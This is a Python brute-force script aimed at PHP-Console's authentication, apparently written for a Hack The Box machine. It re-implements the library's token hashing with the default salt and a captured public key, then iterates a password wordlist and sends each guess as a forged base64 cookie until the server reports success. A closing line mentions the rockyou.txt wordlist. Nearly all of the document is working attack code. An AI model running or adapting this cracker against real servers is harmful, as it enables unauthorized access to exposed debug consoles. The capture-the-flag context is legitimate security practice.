import hashlib
import sys

import json,base64
import requests


class PHP_ConsoleAuth:
    def __init__(self, password, salt, remote_addr = None, pub_key = None):
        self.password = password
        self.salt = salt
        self.remote_addr = remote_addr
        self.pass_hash = None
        self.token = None   
        self.pub_key = pub_key

    
    def getToken(self):
        self.token =  hashlib.sha256(self.pass_hash.encode() + self.pub_key.encode()).digest().hex()
        return self.token
    
    def setPassword(self, password):
        self.password = password

    def calcPassHash(self):
        self.pass_hash = hashlib.sha256(self.password.encode() + self.salt.encode()).digest().hex()
        return self.pass_hash

        

    


"""
Auth lib -> https://github.com/barbushin/php-console/blob/master/src/PhpConsole/Auth.php

"""
if __name__ == '__main__':
    
    SALT = 'NeverChangeIt:)'
    # Pub key is unique because its the sha256sum(clientUID + passwordHash) and the clientUI is the Remote Address, in our case is a fixed one
    # Extracted using chrome extension
    PUB_KEY = "d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e" 
    passwords_list = sys.argv[2]
    hackthebox_url = sys.argv[1]

    auth = PHP_ConsoleAuth(None, SALT, pub_key=PUB_KEY)
    
    success = False

    print("[+] Starting bruteforce on {}  PHP-Console [+]".format(hackthebox_url))
    
    with open(passwords_list, 'r', errors='ignore') as wordlist:
        for password in wordlist.readlines():
            if not password: continue
            password = password.rstrip()
            auth.setPassword(password) 
            auth.calcPassHash()
       #     print("[+] Password Hash - {} [+]".format(auth.getPasswordHash()))
       #     print("[+] Pub Key - {} [+]".format(auth.pub_key))
       #     print("[+] Token - {} [+]".format(auth.getToken()))
        
            print("[+] Trying {} [+]".format(password))
            token = auth.getToken()
            json_req = {
                "php-console-client": 5,
                "auth": {
                    "publicKey": PUB_KEY,
                    "token": token 
                } 
            }

 #           print("[+] Packing information into base64 cookie [+]")
            pack = base64.b64encode(json.dumps(json_req).encode()).decode()
#            print("[+] Cookie packed [+]") 
            cookie = {"php-console-server": "5", "php-console-client": pack}
            req = requests.post(hackthebox_url, cookies=cookie)

            php_console_res = req.headers.get('PHP-Console', None)
            if php_console_res is None:
                print("Is this really running PHP-CONSOLE ?")
                sys.exit(1)
            
            php_console_res = json.loads(php_console_res)
            success = php_console_res['auth']['isSuccess']

            if success:        
                print("[+] Cracked! Password -> {} [+]".format(password))
                break

```

Now, i downloaded rockyou.txt wordlist list